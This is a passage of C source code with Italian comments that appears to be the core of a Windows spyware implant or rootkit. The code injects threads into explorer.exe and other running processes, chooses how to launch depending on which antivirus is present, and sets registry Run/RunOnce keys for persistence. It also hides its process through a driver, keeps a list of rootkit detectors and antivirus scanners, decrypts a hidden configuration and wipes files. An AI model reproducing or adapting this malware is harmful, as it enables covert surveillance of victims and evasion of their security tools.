				RevertWow64Fs(old_value);
			}
		}
	}

	// ---------------------------------------------
	
	if (IsAVG_IS() || IsFSecure() || IsKaspersky()) {
		char exp_cmd[512];
		HM_ExpandStrings(cmd_line, exp_cmd, sizeof(exp_cmd));
		IndirectCreateProcess(exp_cmd, flags, si, pi);
		//CreateProcess(NULL, exp_cmd, 0, 0, FALSE, flags, 0, 0, si, pi);
	} else if (HM_FindPid("zlclient.exe", FALSE)) {
		// Se c'e' zonealarm usa come host ctfmon,
		// se questo non e' presente usa explorer
		HM_CreateProcess(cmd_line, flags, si, pi, HM_FindPid("ctfmon.exe", TRUE));
	} else // Non c'e' zonealarm e usa explorer
		HM_CreateProcess(cmd_line, flags, si, pi, 0);
	HideDevice dev_unhook;
	dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), FALSE);	
}

// Funzione per far eseguire CreateProcess a explorer (o a un altro processo specificato)
// Se fallisce ritorna 0 come child_pid nella struttura PROCESS_INFORMATION
void __stdcall HM_CreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid)
{
	HMCreateProcessThreadDataStruct HMCreateProcessThreadData;
	HMODULE hMod;
	HANDLE hThreadRem;
	HANDLE hProcess;
	DWORD dwThreadId;
	DWORD explorer_pid;
	DWORD dummy;
	BYTE *pCodeRemote;
	BYTE *pDataRemote;

	explorer_pid = host_pid;
	pi->dwProcessId = 0;
	ZeroMemory(&(HMCreateProcessThreadData.pi), sizeof(PROCESS_INFORMATION));
	memcpy(&(HMCreateProcessThreadData.si), si, sizeof(STARTUPINFO));
	HMCreateProcessThreadData.si.dwFlags |= STARTF_FORCEOFFFEEDBACK;
	HMCreateProcessThreadData.flags = flags;

	if (!HM_ExpandStrings(cmd_line, HMCreateProcessThreadData.cmd_line, sizeof(HMCreateProcessThreadData.cmd_line)))
		strcpy(HMCreateProcessThreadData.cmd_line, cmd_line);

	if (! (hMod = GetModuleHandle("KERNEL32.DLL")) )
		return;

	HMCreateProcessThreadData.pCreateProcess = (CreateProcess_t) HM_SafeGetProcAddress(hMod, "CreateProcessA");

	HMCreateProcessThreadData.pCloseHandle = (CloseHandle_t) HM_SafeGetProcAddress(hMod, "CloseHandle");

	if (!HMCreateProcessThreadData.pCreateProcess || !HMCreateProcessThreadData.pCloseHandle)
		return;

	// Cerca il PID di exporer.exe
	// solo se non abbiamo specificato il processo ospite
	if (!explorer_pid)
		explorer_pid = HM_FindPid("explorer.exe", TRUE);

	// Se non trova un processo ospite, o se e' a 64bit, chiama la CreateProcess normale
	if (!explorer_pid || IsX64Process(explorer_pid)) {
		pi->hProcess = 0; pi->hThread = 0;
		IndirectCreateProcess(HMCreateProcessThreadData.cmd_line, flags, si, pi);
		if (pi->hProcess)
			CloseHandle(pi->hProcess);
		if (pi->hThread)
			CloseHandle(pi->hThread);
		pi->hProcess = 0; pi->hThread = 0;
		return;
	}

	// Inietta dentro explorer la funzione per la CreateProcess
	if(HM_sCreateHookA(explorer_pid, 
					   NULL, NULL, 
					   (BYTE *)HM_CreateProcessThread, 
					   500, 
					   (BYTE *)&HMCreateProcessThreadData, 
					   sizeof(HMCreateProcessThreadData)) == NULL)
							return;

	pCodeRemote = (BYTE *)HMCreateProcessThreadData.dwHookAdd;
	pDataRemote = (BYTE *)HMCreateProcessThreadData.dwDataAdd;

	// Esegue il thread in explorer.exe
	hProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, explorer_pid);
	if(hProcess == NULL) 
		return;

	hThreadRem = HM_SafeCreateRemoteThread(hProcess, NULL, 8192, 
									(LPTHREAD_START_ROUTINE)pCodeRemote, 
									(LPVOID)pDataRemote, 0, 
									&dwThreadId);

	if(hThreadRem == NULL) {
		FNC(VirtualFreeEx)(hProcess, pCodeRemote, 0, MEM_RELEASE);
		FNC(VirtualFreeEx)(hProcess, pDataRemote, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return ;
	}
		
	// Aspetta che finisca il thread
	FNC(WaitForSingleObject)(hThreadRem, INFINITE);
	CloseHandle(hThreadRem);

	// Legge la memoria con il PID
	if (HM_SafeReadProcessMemory(hProcess, pDataRemote, &HMCreateProcessThreadData, sizeof(HMCreateProcessThreadData), &dummy))
		pi->dwProcessId = HMCreateProcessThreadData.pi.dwProcessId;

	FNC(VirtualFreeEx)(hProcess, pDataRemote, 0, MEM_RELEASE);
	FNC(VirtualFreeEx)(hProcess, pCodeRemote, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	return;
}


// Funzione per il completamento del path relativo alla posizione della DLL.
// 
char *HM_CompletePath(char *file_name, char *buffer)
{
	_snprintf_s(buffer, _MAX_PATH, _TRUNCATE, "%s\\%s", H4_HOME_PATH, file_name);
	return buffer;
}

WCHAR *HM_CompletePathW(WCHAR *file_name, WCHAR *buffer)
{
	_snwprintf_s(buffer, _MAX_PATH, _TRUNCATE, L"%S\\%s", H4_HOME_PATH, file_name);
	return buffer;
}

// ritorna la data (100-nanosec dal 1601)
BOOL HM_GetDate(nanosec_time *time)
{
	//SYSTEMTIME system_time;
	FILETIME time_nanosec;

	// Prende il tempo di sistema e lo converte in FILETIME (100-nanosecondi)
	FNC(GetSystemTimeAsFileTime)(&time_nanosec);
	//if (!FNC(SystemTimeToFileTime)(&system_time, &time_nanosec))
		//return FALSE;

	time->hi_delay = time_nanosec.dwHighDateTime;
	time->lo_delay = time_nanosec.dwLowDateTime;

	return TRUE;
}

// Inserisce la chiave nel registry per l'avvio automatico
void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
{
	char key_value[DLLNAMELEN*3];
	char dll_path[DLLNAMELEN];
	HKEY hOpen;
	HideDevice reg_device;


#ifndef RUN_ONCE_KEY
	// Se vuole forzarla, non interessa vedere se c'e' gia'
	if (!force_insert) {
		DWORD ktype;
		if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
			if (FNC(RegQueryValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, &ktype, NULL, NULL) == ERROR_SUCCESS) {
				// La chiave c'e' gia'
				FNC(RegCloseKey)(hOpen);
				return;
			}
			FNC(RegCloseKey)(hOpen);
		}
	}
#endif

	// Path a rundll32.exe
	memset(key_value, 0, sizeof(key_value));
	FNC(GetSystemDirectoryA)(key_value, sizeof(key_value));
	strcat(key_value, "\\rundll32.exe ");

	// Path alla DLL e nome funzione
	strcat(key_value, "\""); // Per sicurezza...
	strcat(key_value, HM_CompletePath(dll_name, dll_path));
	strcat(key_value, "\""); // ...metto il path alla dll fra ""
	strcat(key_value, ",HFF8"); 

	// Se riesce a scriverlo col driver esce...
	if (reg_device.unhook_regwriteA(REGISTRY_KEY_NAME, key_value))
		return;

	//...altrimenti prova con le API

#ifdef RUN_ONCE_KEY
	// Tenta di aprire CURRENT_USER: RunOnce ( 'O' uppercase)
	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) {
		if (FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) == ERROR_SUCCESS){
			FNC(RegCloseKey)(hOpen);
			return;
		}
		FNC(RegCloseKey)(hOpen);
	}

	// Tenta di aprire CURRENT_USER: Runonce ( 'o' lowercase)
	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce", &hOpen) == ERROR_SUCCESS) {
		if (FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) == ERROR_SUCCESS) {
			FNC(RegCloseKey)(hOpen);
			return;
		}
		FNC(RegCloseKey)(hOpen);
	}

	// Altrimenti la crea in CURRENT_USER: RunOnce ('O' uppercase)
	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) {
		FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);		
		FNC(RegCloseKey)(hOpen);
	}
#else
	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
		if (FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) == ERROR_SUCCESS){
			FNC(RegCloseKey)(hOpen);
			return;
		}
		FNC(RegCloseKey)(hOpen);
	}
	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
		FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);		
		FNC(RegCloseKey)(hOpen);
	}
#endif
}


// Rimuove la chiave di startup nel registry
void HM_RemoveRegistryKey()
{
	HKEY hOpen;
	HideDevice reg_device;

	// Cerca di cancellare la chiave tramite il driver
	if (reg_device.unhook_regdeleteA(REGISTRY_KEY_NAME))
		return;

#ifdef RUN_ONCE_KEY
	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) 
		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);

	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce", &hOpen) == ERROR_SUCCESS) 
		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
#else
	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) 
		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
#endif
}

// Fa proprio quello che dice il nome
void HM_RemoveDriver()
{
	UninstallDriver();
}

// Ritorna il puntatore a dopo una stringa trovata in memoria
char *HM_memstr(char *memory, char *string)
{
	char *ptr;
	ptr = memory;

	LOOP {
		if (!strcmp(ptr, string))
			return (ptr + strlen(string) + 1);
		ptr++;
	}
}

// Tenta a tutti i costi di cancellare un file
void HM_WipeFileA(char *file_name)
{
	DWORD i;
	HANDLE hf;
	DWORD data_size;
	DWORD data_wiped;
	DWORD dwTmp;
	char wipe_string[]="\x0\x0\x0\x0\x0\x0\x0"; // la lunghezza di wipe string deve essere
	                                            // sotto multiplo di 4GB per evitare loop
	// Toglie il readonly
	for(i=0; i<MAX_DELETE_TRY; i++) {
		if (FNC(SetFileAttributesA)(file_name, FILE_ATTRIBUTE_NORMAL))
			break;
		Sleep(DELETE_SLEEP_TIME);
	}

	// Sovrascrive (solo se e' stato configurato per farlo)
	if (log_wipe_file) {
		for(i=0; i<MAX_DELETE_TRY; i++) {
			if ( (hf = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE ) {
				data_size = FNC(GetFileSize)(hf, NULL);
				if (data_size == INVALID_FILE_SIZE)
					data_size = 0;
				for (data_wiped=0; data_wiped<data_size; data_wiped+=sizeof(wipe_string))
					FNC(WriteFile)(hf, wipe_string, sizeof(wipe_string), &dwTmp, NULL);
				CloseHandle(hf);
				break;
			}
			Sleep(DELETE_SLEEP_TIME);
		}
	}

	// Cancella
	for(i=0; i<MAX_DELETE_TRY; i++) {
		if (FNC(DeleteFileA)(file_name))
			break;
		Sleep(DELETE_SLEEP_TIME);
	}
}


void HM_WipeFileW(WCHAR *file_name)
{
	DWORD i;
	HANDLE hf;
	DWORD data_size;
	DWORD data_wiped;
	DWORD dwTmp;
	char wipe_string[]="\x0\x0\x0\x0\x0\x0\x0"; // la lunghezza di wipe string deve essere
	                                            // sotto multiplo di 4GB per evitare loop

	// Toglie il readonly
	for(i=0; i<MAX_DELETE_TRY; i++) {
		if (FNC(SetFileAttributesW)(file_name, FILE_ATTRIBUTE_NORMAL))
			break;
		Sleep(DELETE_SLEEP_TIME);
	}

	// Sovrascrive (solo se e' stato configurato per farlo)
	if (log_wipe_file) {
		for(i=0; i<MAX_DELETE_TRY; i++) {
			if ( (hf = FNC(CreateFileW)(file_name, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE ) {
				data_size = FNC(GetFileSize)(hf, NULL);
				if (data_size == INVALID_FILE_SIZE)
					data_size = 0;
				for (data_wiped=0; data_wiped<data_size; data_wiped+=sizeof(wipe_string))
					FNC(WriteFile)(hf, wipe_string, sizeof(wipe_string), &dwTmp, NULL);
				CloseHandle(hf);
				break;
			}
			Sleep(DELETE_SLEEP_TIME);
		}
	}
	
	// Cancella
	for(i=0; i<MAX_DELETE_TRY; i++) {
		if (FNC(DeleteFileW)(file_name))
			break;
		Sleep(DELETE_SLEEP_TIME);
	}
}


// Verifica se c'e' una copia integra del file di configurazione.
// Se e' integra la rimpiazza sull'originale. In ogni caso la cancella (se esiste).
// Se rimpiazza l'originale ritorna TRUE.
BOOL HM_CheckNewConf() 
{
	HANDLE h_conf_file;
	BYTE *clear_file;
	char conf_path[DLLNAMELEN];
	char orig_conf_path[DLLNAMELEN];

	h_conf_file = FNC(CreateFileA)(HM_CompletePath(H4_CONF_BU, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	// Se non trova nessun file di backup ritorna (lo considera inesistente)
	if (h_conf_file == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(h_conf_file);

	// Verifica che il file sia integro e decifrabile correttamente
	clear_file = HM_ReadClearConf(H4_CONF_BU);
	if (!clear_file) {
		HM_WipeFileA(HM_CompletePath(H4_CONF_BU, conf_path));
		return FALSE;
	}
	SAFE_FREE(clear_file);

	// Ora il file e' considerato integro e tutti gli handle sono chiusi.
	// Procede quindi alla copia su quello originale.
	// Se fallisce la copia non cancella il backup (lo copiera' al prossimo avvio).
	UnlockConfFile();
	if (!FNC(CopyFileA)(HM_CompletePath(H4_CONF_BU, conf_path), HM_CompletePath(H4_CONF_FILE, orig_conf_path), FALSE))
		return FALSE;
	LockConfFile();

	// La copia e' riuscita, quindi cancella il file di backup e torna TRUE.
	HM_WipeFileA(HM_CompletePath(H4_CONF_BU, conf_path));

	// Nel caso ci sia DeepFreeze, fixa il file di destinazione sul disco reale
	if (IsDeepFreeze()) {
		HideDevice dev_df;
		WCHAR dest_path[MAX_PATH];
		swprintf(dest_path, L"%S", HM_CompletePath(H4_CONF_FILE, orig_conf_path));
		DFFixFile(&dev_df, dest_path);
	}

	return TRUE;
}


// Ritorna una zona di memoria con il file di configurazione
// in chiaro. Va liberata!!!. Torna NULL se fallisce.
BYTE *HM_ReadClearConf(char *conf_name)
{
	HANDLE h_conf_file, h_map = 0;
	BYTE *conf_memory = NULL;
	BYTE *conf_memory_clear = NULL;
	DWORD conf_len = INVALID_FILE_SIZE;
	DWORD *conf_clear_len;
	DWORD *file_crc;
	DWORD temp_len;
	DWORD end_len;
	char conf_path[DLLNAMELEN];
	BYTE iv[BLOCK_LEN];
	char *ptr;
	DWORD conf_hash;
	long long temp_hash;

	end_len = strlen(ENDOF_CONF_DELIMITER) + sizeof(DWORD); // tag di fine piu' CRC
	// Mappa per comodita' il file di configurazione nella memoria
	h_conf_file = FNC(CreateFileA)(HM_CompletePath(conf_name, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (h_conf_file != INVALID_HANDLE_VALUE && (h_map = FNC(CreateFileMappingA)(h_conf_file, NULL, PAGE_READONLY, 0, 0, NULL))) {
		conf_memory = (BYTE *)FNC(MapViewOfFile)(h_map, FILE_MAP_READ, 0, 0, 0);
		conf_len = FNC(GetFileSize)(h_conf_file, NULL);
	}
	
	// Crea una copia in chiaro in memoria
	if (conf_memory && conf_len!=INVALID_FILE_SIZE && conf_len >= (CLEAR_CONF_LEN + sizeof(DWORD) + end_len)) {
		// Alloca la memoria 
		conf_memory_clear = (BYTE *)malloc(conf_len);
		if (conf_memory_clear) {
			// Decifra il file di conf (assume che la parte cifrata sia gia' stata
			// paddata).
			memset(iv, 0, sizeof(iv));
			aes_cbc_decrypt(&crypt_ctx_conf, iv, conf_memory + CLEAR_CONF_LEN, conf_memory_clear, conf_len - CLEAR_CONF_LEN);
		}	
	}
	
	// Chiude il mapping
	if (conf_memory)
		FNC(UnmapViewOfFile)(conf_memory);
	if (h_map)
		CloseHandle(h_map);
	if (h_conf_file != INVALID_HANDLE_VALUE)
		CloseHandle(h_conf_file);

	// Verifica che tutto sia stato decifrato correttamente
	// (altrimenti non torna niente)
	if (conf_memory_clear) {
		// Verifica la lunghezza
		conf_clear_len = (DWORD *)conf_memory_clear;
		temp_len = *conf_clear_len;
		if (temp_len % BLOCK_LEN) {
			temp_len /= BLOCK_LEN;
			temp_len++;
			temp_len *= BLOCK_LEN;
		}
		if (temp_len + CLEAR_CONF_LEN != conf_len) {
			SAFE_FREE(conf_memory_clear);
			return NULL;
		}
		if ( (*conf_clear_len) < end_len) {
			SAFE_FREE(conf_memory_clear);
			return NULL;
		}

		// Check della stringa di fine file (riutilizzo la variabile)
		conf_memory = conf_memory_clear + (*conf_clear_len) - end_len;
		if (memcmp(ENDOF_CONF_DELIMITER, conf_memory, strlen(ENDOF_CONF_DELIMITER)) != 0) {
			SAFE_FREE(conf_memory_clear);
			return NULL;
		}

		// Controlla il CRC (viene fatto su tutta la parte cifrata, togliendo il CRC stesso)
		temp_hash = 0;
		ptr = (char *)conf_memory_clear;
		for (DWORD i=0; i<(*conf_clear_len)-sizeof(DWORD); i++) {
			temp_hash++;
			if (*ptr)
				temp_hash *= (*ptr);
			conf_hash = (DWORD)(temp_hash >> 32);
			temp_hash &= 0xFFFFFFFF;
			temp_hash ^= conf_hash;
			ptr++;
		}
		conf_hash = (DWORD)temp_hash;
		file_crc = (DWORD *)(conf_memory_clear + (*conf_clear_len) - sizeof(DWORD));
		if (*file_crc != conf_hash) {
			SAFE_FREE(conf_memory_clear);
			return NULL;
		}
	}
	return conf_memory_clear;
}


// Legge le configurazioni globali
void HM_UpdateGlobalConf()
{
	HANDLE h_conf_file;
	DWORD readn;
	char conf_path[DLLNAMELEN];
	BYTE *conf_memory;

	// Se non riesce a leggere la configurazione, inizializza comunque
	// i valori globali.
	memset(&date_delta, 0, sizeof(date_delta));
	// Lista di processi da non toccare
	process_bypassed = EMBEDDED_BYPASS;
	strcpy(process_bypass_list[0],"outlook.exe");
	strcpy(process_bypass_list[1],"taskmgr.exe");
	strcpy(process_bypass_list[2],"KProcCheck.exe");
	strcpy(process_bypass_list[3],"TaskMan.exe");
	strcpy(process_bypass_list[4],"hackmon.exe");
	strcpy(process_bypass_list[5],"hiddenfinder.exe");
	strcpy(process_bypass_list[6],"Unhackme.exe");
	strcpy(process_bypass_list[7],"blbeta.exe");
	strcpy(process_bypass_list[8],"fsbl.exe");
	strcpy(process_bypass_list[9],"sargui.exe");
	strcpy(process_bypass_list[10],"avgarkt.exe");
	strcpy(process_bypass_list[11],"avscan.exe");
	strcpy(process_bypass_list[12],"RootkitRevealer.exe");
	strcpy(process_bypass_list[13],"avgscanx.exe");
	strcpy(process_bypass_list[14],"gmer.exe");
	strcpy(process_bypass_list[15],"IceSword.exe");
	strcpy(process_bypass_list[16],"svv.exe");
	strcpy(process_bypass_list[17],"rku*.exe");
	strcpy(process_bypass_list[18],"pavark.exe");
	strcpy(process_bypass_list[19],"avp.exe");
	strcpy(process_bypass_list[20],"bgscan.exe");
	strcpy(process_bypass_list[21],"admin.exe");
	strcpy(process_bypass_list[22],"avk.exe");
	strcpy(process_bypass_list[23],"k7*.exe");
	strcpy(process_bypass_list[24],"rootkitbuster.exe");
	strcpy(process_bypass_list[25],"pcts*.exe");
	strcpy(process_bypass_list[26],"iexplore.exe");
	strcpy(process_bypass_list[27],"chrome.exe");
	// XXX Se ne aggiungo, ricordarsi di modificare EMBEDDED_BYPASS

	// Legge il delta date dal file di stato...
	Log_RestoreAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta)); 

	// Legge la lista dei processi da bypassare 
	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
	
	// Effettua il parsing del file di configurazione mappato
	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
	// (viene assunto che la configurazione sia coerente e il file integro)
	if (conf_memory) {
		DWORD index, param_len;
		BYTE *conf_ptr;

		// conf_ptr si sposta nel file durante la lettura
		conf_ptr = (BYTE *)HM_memstr((char *)conf_memory, BYPAS_CONF_DELIMITER);

		// ---- Configurazione process bypass ----
		READ_DWORD(process_bypassed, conf_ptr);
		if (process_bypassed > MAX_DYNAMIC_BYPASS)
			process_bypassed = MAX_DYNAMIC_BYPASS;
		process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded

		// Legge i processi rimanenti dal file di configurazione
		for (index=EMBEDDED_BYPASS; index<process_bypassed; index++) {
			READ_DWORD(param_len, conf_ptr);
			// Il nome dei processi deve essere NULL terminated
			_snprintf_s(process_bypass_list[index], MAX_PBYPASS_LEN, _TRUNCATE, "%s", (char *)conf_ptr);
			conf_ptr += param_len;
		}
		SAFE_FREE(conf_memory);
	}
}


// Prende il path del browser di default
// Torna TRUE se ci riesce
BOOL HM_GetDefaultBrowser(char *path_name)
{
#define IEPATH "http\\shell\\open\\command"

	HKEY hIEPath;
	char short_path[DLLNAMELEN];
	char unquoted_long_path[DLLNAMELEN];
	DWORD iLen = sizeof(short_path);
	char *clean_short_path;
	char *params;

	// Apre il registry
	if(FNC(RegOpenKeyA)(HKEY_CLASSES_ROOT, IEPATH, &hIEPath) != ERROR_SUCCESS )
		return FALSE;

	if(FNC(RegQueryValueExA)(hIEPath, NULL, NULL, NULL, (BYTE *)short_path, &iLen) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hIEPath);
		return FALSE;
	}
	FNC(RegCloseKey)(hIEPath);

	// Toglie eventuali parametri
	params = strstr(short_path, ".exe");
	if (params)
		params[4] = 0;
	params = strstr(short_path, ".EXE");
	if (params)
		params[4] = 0;
	clean_short_path = short_path;
	if (short_path[0]=='"')
		clean_short_path++; 

	// Prende il long name
	if (!FNC(GetLongPathNameA)(clean_short_path, unquoted_long_path, DLLNAMELEN))
		return FALSE;

	// Lo mette tra "" per evitare ambiguita' alla CreateProcess
	sprintf(path_name, "\"%s\"", unquoted_long_path);
	return TRUE;
}

DWORD WINAPI InjectServiceThread(DWORD dummy)
{
	DWORD service_pid;

	while( (service_pid = FindRunAsService()) == 0 ) 
		Sleep(500);

	HM_sStartHookingThread(service_pid, NULL, TRUE, FALSE);
	return 0;
}

// Inietta il thread di hooking in tutti i processi attivi
// tranne che nel processo chiamante
BOOL HM_HookActiveProcesses()
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD dwCallingPid;
	DWORD integrity_level;
	DWORD dummy;

	// Vede se siamo su Vista
	if (IsVista(&integrity_level) && integrity_level>=IL_HIGH) 
		// Cerca all'infinito di infettare il thread che lancia la UAC
		HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InjectServiceThread, NULL, 0, &dummy);		

	// Continua con l'infection dei processi utente
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	dwCallingPid = FNC(GetCurrentProcessId)();
	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
		return FALSE;

	if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return FALSE;
	}

	// Cicla la lista dei processi attivi
	do {
		// Effettua l'hook solo se il processo non e' il chiamante
		if (pe32.th32ProcessID != dwCallingPid && IsMyProcess(pe32.th32ProcessID))
			HM_sStartHookingThread(pe32.th32ProcessID, NULL, TRUE, TRUE);
	} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	return TRUE ;
}

// Monitora la presenza di nuovi TaskManager
// o explorer.exe in cui effettuare l'injection.
// Monitora anche la coda dei messaggi per effettuare
// la chiusura del processo.
// Diventa il loop principale del programma.
#define HM_PTSLEEPTIME 1400
#define PROCESS_POLLED 6
#define PROCESS_FREQUENTLY_POLLED 4

void HM_StartPolling(void)
{
	MSG msg;
	char *polled_name[PROCESS_POLLED];
	DWORD i, loop_count = 0;
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	char *name_offs;
	BOOL infected;

	polled_name[0] = "taskmgr.exe";
	polled_name[1] = "outlook.exe";
	polled_name[2] = "explorer.exe";
	polled_name[3] = "mghtml.exe";
	polled_name[4] = "iexplore.exe";
	polled_name[5] = "chrome.exe";

	LOOP {
		loop_count++;

		// Usato solo per monitorare il messaggio di QUIT
		// quando viene effettuato il logoff
		HANDLE_SENT_MESSAGES(msg, HM_PTSLEEPTIME);

		pe32.dwSize = sizeof( PROCESSENTRY32 );
		if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE ) 
			continue;
		if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
			CloseHandle( hProcessSnap );
			continue;
		}
		// Cicla la lista dei processi attivi
		do {
			infected = FALSE;
			// Elimina il path
			name_offs = strrchr(pe32.szExeFile, '\\');
			if (!name_offs)
				name_offs = pe32.szExeFile;
			else
				name_offs++;
			// Confronta il nome con quelli da pollare
			if ((loop_count%3) == 0) {
				for (i=0; i<PROCESS_POLLED; i++) {
					if (!_stricmp(name_offs, polled_name[i]) && IsMyProcess(pe32.th32ProcessID)) {
						// Se e' fra quelli lo inietta (HM_sStartHookingThread lo fara' solo la prima volta)
						HM_sStartHookingThread(pe32.th32ProcessID, NULL, FALSE, TRUE);
						infected = TRUE;
						break;
					}
				}
			} else {
				for (i=0; i<PROCESS_FREQUENTLY_POLLED; i++) {
					if (!_stricmp(name_offs, polled_name[i]) && IsMyProcess(pe32.th32ProcessID)) {
						// Se e' fra quelli lo inietta (HM_sStartHookingThread lo fara' solo la prima volta)
						HM_sStartHookingThread(pe32.th32ProcessID, NULL, FALSE, TRUE);
						infected = TRUE;
						break;
					}
				}
			}

			// In questo caso non e' hookata la CreateProcess, quindi infetta tutti i processi tramite polling.
			// La stessa cosa la fa sui sistemi a 64 bit (explorer e' a 64 bit, quindi non infettera' nessun figlio
			// a 32bit). Non cerca di marcare i processi a 64bit (il core gira a 32 e non ci riuscirebbe)
			// Guarda i bypass, marca i processi hookati
			if (!infected && (IsX64System() || IsBitDefender())) {
				DWORD dwCallingPid = FNC(GetCurrentProcessId)();
				if (pe32.th32ProcessID != dwCallingPid && !IsX64Process(pe32.th32ProcessID) && IsMyProcess(pe32.th32ProcessID) )
					HM_sStartHookingThread(pe32.th32ProcessID, NULL, TRUE, TRUE);	
			}
		} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );
		CloseHandle( hProcessSnap );
	}
}


BOOL FindModulePath(char *path_buf, DWORD path_size)
{
	HMODULE hLib= NULL;
	HMODULE modules[1024];
	char temp_buf[_MAX_PATH * 2 + 2];
	char *dos_ascii_name;
	DWORD mod_size;
	DWORD mod_num;
	DWORD i;

	// Se ha gia' le variabili settate le recupera da li'
	// altrimenti (e' la prima volta che lo chiama, o siamo in un servizio che
	// non ha la shared), la calcola al volo.
	HM_CompletePath(H4DLLNAME, path_buf);
	if (strlen(path_buf) >= 3)
		return TRUE;

	// Cerca il modulo che esporta la funzione HFF1 (cioe' se stesso)
	if (!FNC(EnumProcessModules)(FNC(GetCurrentProcess)(), modules, sizeof(modules), &mod_size)) 
		return FALSE;

	mod_num = mod_size/sizeof(HMODULE);
	for (i=0; i<mod_num; i++) {
		// L'abbiamo trovato
		if ((DWORD)GetProcAddress(modules[i], "HFF1") == (DWORD)HM_sCreateHookA)
			hLib = modules[i];
	}

	if (!hLib) 
		return FALSE;
	
	ZeroMemory(temp_buf, sizeof(temp_buf)); // Ci assicuriamo che il nome sia NULL terminato
	if (!FNC(GetModuleFileNameExW)(FNC(GetCurrentProcess)(), hLib, (WCHAR *)temp_buf, _MAX_PATH)) 
		return FALSE;

	if (!(dos_ascii_name = GetDosAsciiName((WCHAR *)temp_buf)))
		return FALSE;

	_snprintf_s(path_buf, path_size, _TRUNCATE, "%s", dos_ascii_name);
	SAFE_FREE(dos_ascii_name);
	
	return TRUE;
}


// Cancella la command line
void HM_ClearCommand()
{
	char *ptr;
	char *cmd_lineA;
	wchar_t *cmd_lineW;
	wchar_t *ptrW;
	
	cmd_lineA = FNC(GetCommandLineA)();
	if ( !(ptr = strchr(cmd_lineA, ' ')) )
		return;
	while(*ptr) {
		*ptr = 0;
		ptr++;
	}

	cmd_lineW = FNC(GetCommandLineW)();
	if ( !(ptrW = wcschr(cmd_lineW, ' ')) )
		return;
	while(*ptrW) {
		*ptrW = 0;
		ptrW++;
	}
}

void LockConfFile()
{
	char conf_path[DLLNAMELEN];
	HM_CompletePath(H4_CONF_FILE, conf_path);
	FNC(SetFileAttributesA)(conf_path, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_ARCHIVE);
